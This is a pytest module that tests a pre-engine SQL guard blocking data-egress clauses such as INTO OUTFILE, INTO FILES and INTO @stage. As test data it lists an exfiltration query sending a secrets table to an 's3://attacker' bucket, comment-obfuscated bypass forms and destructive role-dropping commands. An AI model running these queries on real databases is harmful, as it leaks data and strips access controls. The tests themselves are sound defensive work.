"""Shared-guard regression tests for the data-egress clause family (NOVA-86).

``SELECT … INTO OUTFILE`` / ``INTO FILES(…)`` / ``INTO @stage`` can carry a
result set to object storage. The assistant policy denies them at the consent
gate (NOVA-83); this module covers the *shared* pre-engine guard, which every
user-facing SQL path consults — the worksheet execute, view/table DDL, the ML
statement path and the assistant tool, all through ``guard_user_statement``.

The clause is valid StarRocks grammar (``queryRelation outfile?``), so it reaches
the engine unless the guard refuses it. Detection is literal-aware: a string
value that merely spells the clause is data, not grammar, and stays allowed.
"""

import pytest

from app.common.sql_guard import _blank_string_literals, guard_sql
from app.core.exceptions import ForbiddenSQLError
from app.modules.query.sql_pipeline import guard_user_statement

# ── Acceptance criterion 1: the three named clauses ─────────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV",
        "SELECT 1 INTO FILES('path'='s3://b/x')",
        "SELECT 1 INTO @stage1.x.csv",
        "SELECT * FROM secrets INTO OUTFILE 's3://attacker/leak.csv' FORMAT AS CSV",
        "INSERT INTO FILES('path'='s3://b/x') SELECT * FROM t",
    ],
)
def test_egress_clause_is_refused_by_the_shared_pipeline(sql):
    with pytest.raises(ForbiddenSQLError):
        guard_user_statement(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV",
        "SELECT 1 INTO FILES('path'='s3://b/x')",
        "SELECT 1 INTO @stage1.x.csv",
    ],
)
def test_egress_clause_is_refused_by_guard_sql(sql):
    with pytest.raises(ForbiddenSQLError):
        guard_sql(sql)


def test_refusal_names_the_offending_clause():
    with pytest.raises(ForbiddenSQLError, match="OUTFILE"):
        guard_sql("SELECT 1 INTO OUTFILE 's3://b/x'")
    with pytest.raises(ForbiddenSQLError, match="FILES"):
        guard_sql("SELECT 1 INTO FILES('path'='s3://b/x')")
    with pytest.raises(ForbiddenSQLError, match="@stage"):
        guard_sql("SELECT 1 INTO @stage1.x.csv")


# ── Acceptance criterion 3: literal-aware, comment-aware ────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 'INTO OUTFILE' AS note",
        "SELECT 'INTO @stage1.x.csv' AS note",
        "SELECT 'INTO FILES(path=''s3://b'')' AS note",
        "SELECT 'INTOOUTFILE' AS note",
        "SELECT 'INTO@stage' AS note",
        "SELECT into_outfile FROM t",
    ],
)
def test_a_literal_or_identifier_that_spells_the_clause_is_allowed(sql):
    guard_user_statement(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT /*x*/ INTO OUTFILE 's3://b/x'",
        "SELECT 1 INTO /*x*/ OUTFILE 's3://b/x'",
        "SELECT /*x*/ INTO @stage1.x.csv",
        "SELECT 1 INTO /**/OUTFILE 's3://b/x'",
        "SELECT 1 INTO/**/@stage1.x.csv",
        "SELECT 1\nINTO\nOUTFILE 's3://b/x'",
    ],
)
def test_comment_and_newline_obfuscated_forms_are_refused(sql):
    with pytest.raises(ForbiddenSQLError):
        guard_user_statement(sql)


# ── The zero-gap family: ``@`` is its own token, so no space is required ────


@pytest.mark.parametrize(
    "sql",
    [
        # ``INTO`` and ``AT`` are separate lexer tokens, so deleting the one
        # space is the same clause to the engine.
        "SELECT 1 INTO@stage1.x.csv",
        "SELECT * FROM t INTO@stage1.x.csv",
        "select 1 into@stage1.x.csv",
        "SELECT 1 INTO/**/@stage1.x.csv",
    ],
)
def test_into_stage_with_no_whitespace_before_at_is_refused(sql):
    with pytest.raises(ForbiddenSQLError):
        guard_user_statement(sql)


def test_no_whitespace_stage_literal_still_allowed():
    guard_user_statement("SELECT 'INTO@stage1' AS note")


@pytest.mark.parametrize(
    "sql",
    [
        # A zero-width match on the OUTFILE/FILES patterns would also hit the
        # unquoted form of an identifier-shaped string literal: the module's
        # quote-collapse rule turns ``'INTOOUTFILE'`` into ``INTOOUTFILE``. These
        # are values, not clauses, and must stay allowed.
        "SELECT 'INTOOUTFILE' AS note",
        "SELECT 'INTOFILES' AS note",
    ],
)
def test_no_whitespace_outfile_like_literals_are_allowed(sql):
    guard_user_statement(sql)


# ── Acceptance criterion 4: multi-statement deny-wins ───────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1; SELECT 1 INTO OUTFILE 's3://b/x'",
        "SELECT 1; SELECT * FROM t INTO @stage1.x.csv",
        "SELECT 1; SELECT 1 INTO@stage1.x.csv",
        "SELECT 1; INSERT INTO FILES('path'='s3://b/x') SELECT * FROM t",
    ],
)
def test_a_write_clause_in_any_statement_refuses_the_whole_payload(sql):
    with pytest.raises(ForbiddenSQLError):
        guard_user_statement(sql)


def test_a_clean_multi_statement_payload_still_passes():
    guard_user_statement("SELECT 1; SELECT 2 FROM t")


# ── Acceptance criterion 5: existing protections untouched ──────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "DROP ROLE ACCOUNTADMIN",
        "REVOKE ALL ON *.* FROM ROLE ACCOUNTADMIN",
        "ALTER ROLE ACCOUNTADMIN RENAME TO admin",
        "DROP USER root",
        "DROP GLOBAL FUNCTION AI_COMPLETE(string)",
    ],
)
def test_existing_blocked_patterns_still_refuse(sql):
    with pytest.raises(ForbiddenSQLError):
        guard_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM my_table",
        "CREATE TABLE test (id INT)",
        "DROP ROLE analyst",
        "DROP USER testuser",
    ],
)
def test_ordinary_statements_still_pass(sql):
    guard_sql(sql)


def test_literal_blanking_preserves_length():
    """The egress scan must not shift offsets while blanking literals."""
    sql = "SELECT 'INTO OUTFILE' AS note"
    blanked = _blank_string_literals(sql)
    assert len(blanked) == len(sql)
    assert "INTO" not in blanked
